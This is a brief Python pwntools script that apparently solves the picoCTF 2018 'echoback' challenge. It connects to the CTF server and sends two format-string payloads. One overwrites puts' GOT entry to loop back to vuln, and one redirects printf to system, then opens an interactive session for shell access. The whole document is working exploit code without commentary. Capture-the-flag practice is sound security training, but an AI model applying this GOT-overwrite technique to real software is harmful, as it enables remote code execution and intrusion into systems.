from pwn import *
from bayb0pwn import *

elf = ELF('./echoback')
r = remote('2018shell.picoctf.com', 37402 )

fmt1 = createFmt32( elf.got["puts"], elf.symbols["vuln"], 7 )
info("fmt1: %s"%fmt1 )
r.sendlineafter(':\n', fmt1 )

fmt2 = createFmt32( elf.got["printf"], elf.plt["system"], 7 )
info("fmt2: %s"%fmt2 )
r.sendlineafter(':\n', fmt2 )

r.interactive()
